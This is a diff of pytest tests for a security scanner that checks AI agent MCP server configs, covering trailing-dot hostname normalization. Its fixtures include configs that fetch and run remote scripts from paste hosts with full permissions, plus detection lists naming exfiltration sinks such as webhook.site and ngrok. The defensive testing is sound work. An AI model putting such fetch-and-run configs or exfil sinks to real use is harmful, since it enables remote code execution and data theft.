@@ -33,6 +33,9 @@ from scanners.agent_supply_chain import (  # noqa: E402
     _is_public_ip_literal,
     _parse_ipv4_number,
     _normalize_ipv4_host,
+    _normalize_host,
+    _is_local_or_private_host,
+    _n8n_is_oob_sink,
 )
 
 
@@ -1110,6 +1113,103 @@ def test_is_public_ip_literal_obfuscated_forms():
     assert _is_public_ip_literal("2130706433") is False  # 127.0.0.1
     assert _is_public_ip_literal("0x7f000001") is False  # 127.0.0.1
     assert _is_public_ip_literal("api.vendor.com") is False
+
+
+# --- Trailing-dot FQDN host normalization (F9) ---------------------------------
+# `example.com.` and `example.com` are the same host to every resolver, but the host
+# suffix match in _check_mcp_remote_source had no trailing-dot strip, so the FQDN form
+# of a raw/paste source scored 0 while the dotless form fired. The same omission ran the
+# other way in _is_local_or_private_host, where `http://localhost./` stopped looking
+# local and was reported as a public cleartext endpoint. One shared `_normalize_host`
+# now backs every host-comparison site.
+
+@pytest.mark.parametrize("raw,expected", [
+    ("raw.githubusercontent.com.", "raw.githubusercontent.com"),
+    ("PASTEBIN.COM.", "pastebin.com"),
+    ("  api.vendor.com.  ", "api.vendor.com"),
+    ("[::1]", "::1"),
+    ("localhost.", "localhost"),
+    ("example.com", "example.com"),   # already canonical — unchanged
+    ("example.com..", "example.com"),  # defensive: any number of trailing dots
+    (".", ""),
+    ("", ""),
+])
+def test_normalize_host(raw, expected):
+    assert _normalize_host(raw) == expected
+
+
+@pytest.mark.parametrize("host", [
+    "raw.githubusercontent.com.",
+    "gist.githubusercontent.com.",
+    "pastebin.com.",
+    "evil.pastebin.com.",   # subdomain of a known host, FQDN form
+    "RAW.GITHUBUSERCONTENT.COM.",  # uppercase + trailing dot together
+])
+def test_remote_source_trailing_dot_fqdn_flagged(scanner, tmp_path, host):
+    config = {
+        "mcpServers": {
+            "svc": {"command": "deno", "args": ["run", "-A", f"https://{host}/e/v/s.ts"]}
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        f"the trailing-dot FQDN form of a raw/paste source ({host}) must be flagged"
+
+
+def test_remote_source_trailing_dot_vendor_host_not_flagged(scanner, tmp_path):
+    # Normalizing away the trailing dot must not turn an ordinary vendor endpoint
+    # into a finding — only a genuinely known raw/paste host may match.
+    config = {
+        "mcpServers": {
+            "ok": {"command": "npx", "args": ["mcp-remote", "https://api.vendor.com./mcp"]},
+            "np": {"command": "npx", "args": ["-y", "@scope/server@1.2.3"]},
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert not any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        "a trailing-dot vendor hostname must not be flagged"
+
+
+@pytest.mark.parametrize("url", [
+    "http://localhost.:3000/mcp",
+    "http://box.local./mcp",
+    "http://svc.internal.:8080/sse",
+    "http://host.docker.internal.:3000/mcp",
+])
+def test_cleartext_transport_trailing_dot_local_host_not_flagged(scanner, tmp_path, url):
+    # The inverse of the MCP-005 evasion: a local dev endpoint written as an FQDN is
+    # still local, and must not be reported as a public cleartext endpoint.
+    config = {"mcpServers": {"dev": {"url": url}}}
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert not any(f.cve_id == "AGENT-MCP-006" for f in result.findings), \
+        f"a trailing-dot local host ({url}) must not be flagged as a public endpoint"
+
+
+def test_cleartext_transport_trailing_dot_public_host_still_flagged(scanner, tmp_path):
+    # ...and normalization must not suppress the real finding it mirrors.
+    config = {"mcpServers": {"remote": {"url": "http://api.public-vendor.com./mcp"}}}
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert any(f.cve_id == "AGENT-MCP-006" for f in result.findings), \
+        "a trailing-dot PUBLIC host over cleartext must still be flagged"
+
+
+@pytest.mark.parametrize("host", ["localhost.", "box.local.", "127.0.0.1.", "192.168.1.1."])
+def test_is_local_or_private_host_trailing_dot(host):
+    assert _is_local_or_private_host(host) is True
+
+
+@pytest.mark.parametrize("host", ["api.vendor.com.", "8.8.8.8."])
+def test_is_local_or_private_host_trailing_dot_public(host):
+    assert _is_local_or_private_host(host) is False
+
+
+def test_n8n_oob_sink_trailing_dot_behaviour_preserved():
+    # _n8n_is_oob_sink already stripped the trailing dot with a private copy of the
+    # normalization; routing it through the shared helper must not change any answer.
+    assert _n8n_is_oob_sink("webhook.site.") is True
+    assert _n8n_is_oob_sink("webhook.site") is True
+    assert _n8n_is_oob_sink("x.ngrok.io.") is True
+    assert _n8n_is_oob_sink("api.vendor.com.") is False
 
 
 # --- AGENT-N8N-002: credential read paired with an external exfil sink ----------
